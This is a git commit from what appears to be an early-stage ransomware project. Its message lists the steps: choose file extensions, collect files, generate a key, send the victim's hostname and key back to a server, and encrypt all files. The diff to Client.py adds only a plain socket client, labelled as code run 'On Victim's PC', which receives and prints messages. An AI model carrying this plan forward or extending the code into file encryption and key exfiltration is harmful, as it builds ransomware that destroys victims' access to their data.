c25ba7fbea4407692141010816d8f2f9b4fb1ea0
abhirules27 <abhirules27@gmail.com>
2022-08-15 14:26:50 +0530

    Step 1: Creating Safeguard mechanism Step 2: Selection of Extensions Step 3: Grab all files from List Step 4: Generate Key Step 5: Grab Target details Step 6: Send Hostname & Key back to Server Step 7: Encrypt all files

--- Client.py
+++ Client.py
@@ -1,13 +1,28 @@
-# Client Code
+# Client Code:  Code 1
 # To be converted in exe
 
+# import socket
+# SERVER_IP='192.168.0.199'
+# SERVER_PORT=5678
+#
+# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+#     s.connect((socket.gethostname(), SERVER_PORT))
+#     data = s.recv(1024)
+#     print(data)
+#
+# input()                         #To stay on Screen
+# _________________________________________________________________
+
+# Client Code: Code 2 (On Victim's PC
+
 import socket
-SERVER_IP='192.168.0.181'
-SERVER_PORT=5678
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((socket.gethostname(), 1234))
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((SERVER_IP,SERVER_PORT))
-    data = s.recv(1024)
-    print(data)
-
-input()                         // To stay on Screen
+full_msg = ''
+while True:
+    msg = s.recv(8)
+    if len(msg) <= 0:
+        break
+    full_msg += msg.decode("utf-8")
+print(full_msg)
